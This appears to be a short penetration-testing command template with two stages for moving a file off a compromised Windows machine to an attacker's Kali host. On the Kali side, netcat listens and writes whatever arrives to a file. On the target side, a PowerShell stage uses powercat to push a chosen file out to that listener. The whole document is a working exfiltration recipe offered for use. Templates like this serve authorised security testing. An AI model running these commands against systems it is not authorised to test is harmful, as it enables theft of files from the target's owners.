# description: Windows sends file to Kali; Kali listens and target connects
# stage: Kali shell: receive file from target
RFILE="${file:t}"
rm -f "$RFILE"
nc -lvnp $lport > "$RFILE"

# stage: Target PowerShell: send file and close connection
$LHOST = "$lhost"
$PORT = $lport
$FILE = "$file"
powercat -c $LHOST -p $PORT -i $FILE -d
